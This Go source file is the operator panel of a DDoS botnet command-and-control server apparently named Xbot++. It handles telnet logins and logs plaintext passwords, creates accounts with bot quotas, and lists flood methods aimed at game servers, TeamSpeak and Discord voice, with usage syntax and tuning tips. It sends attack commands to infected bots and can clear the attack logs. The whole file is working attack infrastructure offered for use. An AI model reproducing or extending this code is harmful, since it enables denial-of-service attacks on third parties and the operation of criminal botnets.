package main

import (
	"fmt"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"time"
)

type Admin struct {
	conn net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
	return &Admin{conn}
}

func (this *Admin) Handle() {
	this.conn.Write([]byte("\033[?1049h"))
	this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

	defer func() {
		this.conn.Write([]byte("\033[?1049l"))
	}()

	// Get usernameส
	this.conn.Write([]byte(fmt.Sprintf("\033]0;Please enter your username and password.\007")))
	this.conn.SetDeadline(time.Now().Add(300 * time.Second))
	this.conn.Write([]byte("\033[2J\033[1H"))
	this.conn.Write([]byte("Username:"))
	username, err := this.ReadLine(false)
	if err != nil {
		return
	}

	// Get password
	this.conn.SetDeadline(time.Now().Add(300 * time.Second))
	this.conn.Write([]byte("Password:"))
	password, err := this.ReadLine(true)
	if err != nil {
		return
	}

	this.conn.SetDeadline(time.Now().Add(300 * time.Second))
	this.conn.Write([]byte("\r\n"))
	spinBuf := []byte{'V', 'e', 'r', 'i', 'f', 'y', '.', '.', '.'}
	for i := 0; i < 15; i++ {
		this.conn.Write([]byte(fmt.Sprintf("\033]0;Waiting...\007")))
		this.conn.Write(append([]byte("\r\x1b[0;36mLoading\x1b[1;30m"), spinBuf[i%len(spinBuf)]))
		time.Sleep(time.Duration(10) * time.Millisecond)
	}
	this.conn.Write([]byte("\r\n"))

	// เพิ่ม rate limiting
	rateLimiter := time.NewTicker(time.Second)
	defer rateLimiter.Stop()

	// เพิ่ม timeout
	this.conn.SetDeadline(time.Now().Add(300 * time.Second))

	var loggedIn bool
	var userInfo AccountInfo
	if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
		this.conn.Write([]byte("\r\x1b[1;31mError\r\n"))
		buf := make([]byte, 1)
		this.conn.Read(buf)
		return
	}

	if len(username) > 0 && len(password) > 0 {
		log.SetFlags(log.LstdFlags)
		loginLogsOutput, err := os.OpenFile("logs/logins.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0665)
		if err != nil {
			fmt.Println("Error: ", err)
		}
		success := "successful login"
		usernameFormat := "username:"
		passwordFormat := "password:"
		ipFormat := "ip:"
		cmdSplit := "|"
		log.SetOutput(loginLogsOutput)
		log.Println(cmdSplit, success, cmdSplit, usernameFormat, username, cmdSplit, passwordFormat, password, cmdSplit, ipFormat, this.conn.RemoteAddr())
	}

	this.conn.Write([]byte("\033[2J\033[1H"))
	this.conn.Write([]byte("\r\x1b[1;37mWelcome to \x1b[1;31mXbot++\r\n"))
	this.conn.Write([]byte("\r\x1b[1;37mtype ? to see all commands.\r\n"))
	this.conn.Write([]byte("\r\n\033[0m"))

	go func() {
		i := 0
		for {
			var BotCount int
			if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
				BotCount = userInfo.maxBots
			} else {
				BotCount = clientList.Count()
			}

			time.Sleep(time.Second)
			if userInfo.admin == 1 {
				if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;Bots %d                                                            Running %d \007", BotCount, database.fetchRunningAttacks()))); err != nil {
					this.conn.Close()
					break
				}
			}
			if userInfo.admin == 0 {
				if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;%d Bots :: %d running atk\007", BotCount, database.fetchRunningAttacks()))); err != nil {
					this.conn.Close()
					break
				}
			}
			i++
			if i%60 == 0 {
				this.conn.SetDeadline(time.Now().Add(120 * time.Second))
			}
		}
	}()

	for {
		var botCatagory string
		var botCount int
		this.conn.Write([]byte("\r\x1b[1;37m" + username + "@xbot~# \033[0m"))
		cmd, err := this.ReadLine(false)
		if err != nil || cmd == "exit" || cmd == "quit" {
			return
		}
		if cmd == "" {
			continue
		}
		if err != nil || cmd == "cls" || cmd == "clear" || cmd == "c" {
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\r\x1b[1;37m Welcome to \x1b[1;31mXbot++\r\n"))
			this.conn.Write([]byte("\r\n\033[0m"))
			continue
		}
		if cmd == "mix" || cmd == "methods" || cmd == "method" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("[38;5;231m   -     udp-x          udp high GB/s.     \r\n"))
			this.conn.Write([]byte("[38;5;231m   -     samp-x         for San Andreas Multiplayer.     \r\n"))
			this.conn.Write([]byte("[38;5;231m   -     tcp-x          tcp full handshake.     \r\n"))
			this.conn.Write([]byte("[38;5;231m   -     pps-x          udp high packet/s.     \r\n"))
			this.conn.Write([]byte("[38;5;231m   -     nudp-x         udp for bypass.     \r\n"))
			this.conn.Write([]byte("[38;5;231m   -     ntcp-x         null tcp.     \r\n"))
			this.conn.Write([]byte("[38;5;231m   -     icmp-x         icmp flood.     \r\n"))
			this.conn.Write([]byte("[38;5;231m   -     tcp-rand       tcp random flag.     \r\n"))
			this.conn.Write([]byte("[38;5;231m   -     ts3-x          udp for teamspeak3 server.     \r\n"))
			this.conn.Write([]byte("[38;5;231m   -     discord        for discord voic.     \r\n"))
			this.conn.Write([]byte("[38;5;231m   -     udppay         Custom udp payload with your self.    \r\n"))
			this.conn.Write([]byte("\r\n\033[0m"))
			continue
		}
		if cmd == "info" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("[38;5;231m                               \x1b[1;31mX-BOT \x1b[1;37minformation\r\n"))
			this.conn.Write([]byte("\r\n\033[0m"))
			this.conn.Write([]byte("[38;5;231m   -     Bot version   1.5 or Xbot++\r\n"))
			this.conn.Write([]byte("[38;5;231m   -     Commands      methods, bot, cls, logout         \r\n"))
			this.conn.Write([]byte("[38;5;231m   -     Update        9/3/2568            \r\n"))
			this.conn.Write([]byte("[38;5;231m   -     System        CNC running on Ubuntu.             \r\n"))
			this.conn.Write([]byte("[38;5;231m   -     info          This bot make by akanine.\r\n"))
			this.conn.Write([]byte("[38;5;231m   -     Bot           Support Windows Only.            \r\n"))
			this.conn.Write([]byte("\r\n\033[0m"))
			continue
		}
		if cmd == "cd" || cmd == "ls" || cmd == "rm -rf" || cmd == "rm"{
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\r\n\033[0m"))
			this.conn.Write([]byte("[38;5;231m Do you think you are using Linux ?\r\n"))
			this.conn.Write([]byte("\r\n\033[0m"))
			continue
		}

		if err != nil || cmd == "logout" || cmd == "LOGOUT" {
			return
		}

		if userInfo.admin == 1 && cmd == "?" || cmd == "help" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("[38;5;231m   -     help           Admin commands.     \r\n"))
			this.conn.Write([]byte("[38;5;231m   -     killbot        Kill all bot online.    \r\n"))
			this.conn.Write([]byte("[38;5;231m   -     killport       Kill all port Rat and other botnet.    \r\n"))
			this.conn.Write([]byte("[38;5;231m   -     methods        Show all method.     \r\n"))
			this.conn.Write([]byte("[38;5;231m   -     bot            Show bot online.     \r\n"))
			this.conn.Write([]byte("[38;5;231m   -     info           Show bot informations.     \r\n"))
			this.conn.Write([]byte("[38;5;231m   -     ongoing        Show ongoing attacks.     \r\n"))
			this.conn.Write([]byte("[38;5;231m   -     methodset      Show Method informations and Method setting.     \r\n"))
			this.conn.Write([]byte("\r\n\033[0m"))
			continue
		}

		if userInfo.admin == 1 && cmd == "methodset" || cmd == "mset" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("[38;5;231m       --Methods--         -----------Commands-----------"))
			this.conn.Write([]byte("\r\n\033[0m"))
			this.conn.Write([]byte("[38;5;231m   -     udp-x          udp-x 1.1.1.1 time port=80 conns=3      \r\n"))
			this.conn.Write([]byte("[38;5;231m   -     tcp-x          tcp-x  1.1.1.1 time port=80  conns=3   \r\n"))
			this.conn.Write([]byte("[38;5;231m   -     pps-x          pps-x  1.1.1.1 time port=80 size=18 conns=3    \r\n"))
			this.conn.Write([]byte("[38;5;231m   -     ts3-x          ts3-x 1.1.1.1 time port=80   \r\n"))
			this.conn.Write([]byte("[38;5;231m   -     samp-x         samp-x  1.1.1.1 time port=80  conns=3   \r\n"))
			this.conn.Write([]byte("[38;5;231m   -     nudp-x         nudp-x  1.1.1.1 time port=80 size=48 conns=3   \r\n"))
			this.conn.Write([]byte("[38;5;231m   -     ntcp-x         ntcp  1.1.1.1 time port=80 conns=3    \r\n"))
			this.conn.Write([]byte("[38;5;231m   -     icmp-x         icmp 1.1.1.1 time conns=3   \r\n"))
			this.conn.Write([]byte("[38;5;231m   -     tcp-rand       tcp-rand  1.1.1.1 time port=80 conns=3    \r\n"))
			this.conn.Write([]byte("[38;5;231m   -     discord        discord  1.1.1.1 time port=80 conns=3    \r\n"))
			this.conn.Write([]byte("[38;5;231m   -     udppay         udppay1.1.1.1 time port=80 payload=x90xF8 conns=3    \r\n"))
			this.conn.Write([]byte("\r\n\033[0m"))
			this.conn.Write([]byte("[38;5;231m **Warning from akanine** \r\n"))
			this.conn.Write([]byte("[38;5;231m    - udppay use this for udp custom payload with your self. \r\n"))
			this.conn.Write([]byte("[38;5;231m    - pps-x size= 18/48/32/256 | 18 is best for pps flood.\r\n"))
			this.conn.Write([]byte("[38;5;231m    - udp-x is High GB/s low pps Use for big target only.\r\n"))
			this.conn.Write([]byte("[38;5;231m    - nudp-x is Custom packet size and random packet/s.\r\n"))
			this.conn.Write([]byte("\r\n\033[0m"))
			continue
		}

		if len(cmd) > 0 {
			log.SetFlags(log.LstdFlags)
			output, err := os.OpenFile("logs/commands.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0666)
			if err != nil {
				fmt.Println("Error: ", err)
			}
			usernameFormat := "username:"
			cmdFormat := "command:"
			ipFormat := "ip:"
			cmdSplit := "|"
			log.SetOutput(output)
			log.Println(cmdSplit, usernameFormat, username, cmdSplit, cmdFormat, cmd, cmdSplit, ipFormat, this.conn.RemoteAddr())
		}

		botCount = userInfo.maxBots

		if userInfo.admin == 1 && cmd == "admin" {
			this.conn.Write([]byte("Username: "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("Password: "))
			new_pw, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("-1 for Full Bots.\r\n"))
			this.conn.Write([]byte("Allowed Bots: "))
			max_bots_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			max_bots, err := strconv.Atoi(max_bots_str)
			if err != nil {
				continue
			}
			this.conn.Write([]byte("0 for Max attack duration. \r\n"))
			this.conn.Write([]byte("Allowed Duration: "))
			duration_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			duration, err := strconv.Atoi(duration_str)
			if err != nil {
				continue
			}
			this.conn.Write([]byte("0 for no cooldown. \r\n"))
			this.conn.Write([]byte("Cooldown: "))
			cooldown_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				continue
			}
			this.conn.Write([]byte("Username: " + new_un + "\r\n"))
			this.conn.Write([]byte("Password: " + new_pw + "\r\n"))
			this.conn.Write([]byte("Duration: " + duration_str + "\r\n"))
			this.conn.Write([]byte("Cooldown: " + cooldown_str + "\r\n"))
			this.conn.Write([]byte("Bots: " + max_bots_str + "\r\n"))
			this.conn.Write([]byte(""))
			this.conn.Write([]byte("Confirm(y): "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.createAdmin(new_un, new_pw, max_bots, duration, cooldown) {
				this.conn.Write([]byte("Failed to create Admin! \r\n"))
			} else {
				this.conn.Write([]byte("Admin created! \r\n"))
			}
			continue
		}

		if userInfo.admin == 1 && cmd == "logs" {
			this.conn.Write([]byte("[38;5;231mClear attack logs (y/n):"))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.CleanLogs() {
				this.conn.Write([]byte(fmt.Sprintf("\033[01;31mError, can't clear logs, please check debug logs\r\n")))
			} else {
				this.conn.Write([]byte("\033[1;92mAll Attack logs has been cleaned !\r\n"))
				fmt.Println("\033[1;91m[\033[1;92mServerLogs\033[1;91m] Logs has been cleaned by \033[1;92m" + username + " \033[1;91m!\r\n")
			}
			continue
		}

		if userInfo.admin == 1 && cmd == "remove" {
			this.conn.Write([]byte("Username: "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if !database.removeUser(new_un) {
				this.conn.Write([]byte("User doesn't exists.\r\n"))
			} else {
				this.conn.Write([]byte("User removed\r\n"))
			}
			continue
		}

		if userInfo.admin == 1 && cmd == "user" {
			this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m Enter New Username: "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m Choose New Password: "))
			new_pw, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m Enter Bot Count (-1 For Full Bots): "))
			max_bots_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			max_bots, err := strconv.Atoi(max_bots_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m \x1b[1;30m%s\033[0m\r\n", "Failed To Parse The Bot Count")))
				continue
			}
			this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m Max Attack Duration (-1 For None): "))
			duration_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			duration, err := strconv.Atoi(duration_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m \x1b[0;37%s\033[0m\r\n", "Failed To Parse The Attack Duration Limit")))
				continue
			}
			this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m Cooldown Time (0 For None): "))
			cooldown_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m \x1b[1;30m%s\033[0m\r\n", "Failed To Parse The Cooldown")))
				continue
			}
			this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m New Account Info: \r\nUsername: " + new_un + "\r\nPassword: " + new_pw + "\r\nBotcount: " + max_bots_str + "\r\nContinue? (Y/N): "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m \x1b[1;30m%s\033[0m\r\n", "Failed To Create New User. An Unknown Error Occured.")))
			} else {
				this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m User Added Successfully.\033[0m\r\n"))
			}
			continue
		}
		if userInfo.admin == 1 && cmd == "bot" {
			botCount = clientList.Count()
			m := clientList.Distribution()
			for k, v := range m {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[1;37m%s: \x1b[1;31m%d\033[0m\r\n\033[0m", k, v)))
			}
			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;37mTotal botcount: \x1b[1;31m%d\r\n\033[0m", botCount)))
			continue
		}
		if cmd[0] == '-' {
			countSplit := strings.SplitN(cmd, " ", 2)
			count := countSplit[0][1:]
			botCount, err = strconv.Atoi(count)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30mFailed To Parse Botcount \"%s\"\033[0m\r\n", count)))
				continue
			}
			if botCount == -1 {
				botCount = clientList.Count()
			} else if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30mBot Count To Send Is Bigger Than Allowed Bot Maximum\033[0m\r\n")))
				continue
			}
			cmd = countSplit[1]
		} else {
			args := strings.Split(cmd, " ")
			for _, arg := range args {
				if strings.HasPrefix(arg, "bot=") {
					botStr := strings.Split(arg, "=")[1]
					botCount, err = strconv.Atoi(botStr)
					if err != nil || botCount == -1 {
						botCount = clientList.Count()
					} else if botCount < 1 {
						botCount = userInfo.maxBots
					} else if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
						botCount = userInfo.maxBots
					}
					break
				}
			}
			if botCount == 0 {
				botCount = userInfo.maxBots
			}
		}
		if cmd == "ongoing" {
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte(fmt.Sprintf("\r\x1b[1;37m%-10s %-15s %-6s %-8s %-8s %-10s\r\n",
				"Method", "    Target", "     Port", "      Time", "       TimeLeft", "        User")))
			this.conn.Write([]byte("\r\x1b[1;37m" + strings.Repeat("-", 80) + "\r\n"))

			attacks := database.GetOngoingAttacks()
			for _, attack := range attacks {
				port := "-"
				if p, ok := attack["port"]; ok {
					port = fmt.Sprintf("%v", p)
				}

				// แต่ละแถวของการโจมตี
				this.conn.Write([]byte(fmt.Sprintf("\r\x1b[1;31m%-10s \x1b[1;37m%-15s      %-6s      %-8d      %-8d      %-10s\r\n",
					attack["method"],
					attack["target"],
					port,
					attack["duration"],
					attack["time_left"],
					attack["username"])))
			}
			this.conn.Write([]byte("\r\n"))
			continue
		}

		atk, err := NewAttack(cmd, userInfo.admin)
		if err != nil {
			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m%s\033[0m\r\n", err.Error())))
		} else {
			buf, err := atk.Build()
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m%s\033[0m\r\n", err.Error())))
			} else {
				if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
					this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m%s\033[0m\r\n", err.Error())))
				} else if !database.ContainsWhitelistedTargets(atk) {
					clientList.QueueBuf(buf, botCount, botCatagory)
					this.conn.Write([]byte(fmt.Sprintf("\x1b[1;37mCommand sent to all bots.\r\n")))
				} else {
					fmt.Println("Blocked Command By " + username + " To Whitelisted Prefix")
				}
			}
		}
	}
}

func (this *Admin) ReadLine(masked bool) (string, error) {
	buf := make([]byte, 1024)
	bufPos := 0

	for {
		n, err := this.conn.Read(buf[bufPos : bufPos+1])
		if err != nil || n != 1 {
			return "", err
		}
		if buf[bufPos] == '\xFF' {
			n, err := this.conn.Read(buf[bufPos : bufPos+2])
			if err != nil || n != 2 {
				return "", err
			}
			bufPos--
		} else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
			if bufPos > 0 {
				this.conn.Write([]byte(string(buf[bufPos])))
				bufPos--
			}
			bufPos--
		} else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
			bufPos--
		} else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
			this.conn.Write([]byte("\r\n"))
			return string(buf[:bufPos]), nil
		} else if buf[bufPos] == 0x03 {
			this.conn.Write([]byte("^C\r\n"))
			return "", nil
		} else {
			if buf[bufPos] == '\x1B' {
				buf[bufPos] = '^'
				this.conn.Write([]byte(string(buf[bufPos])))
				bufPos++
				buf[bufPos] = '['
				this.conn.Write([]byte(string(buf[bufPos])))
			} else if masked {
				this.conn.Write([]byte("*"))
			} else {
				this.conn.Write([]byte(string(buf[bufPos])))
			}
		}
		bufPos++
	}
	return string(buf), nil
}
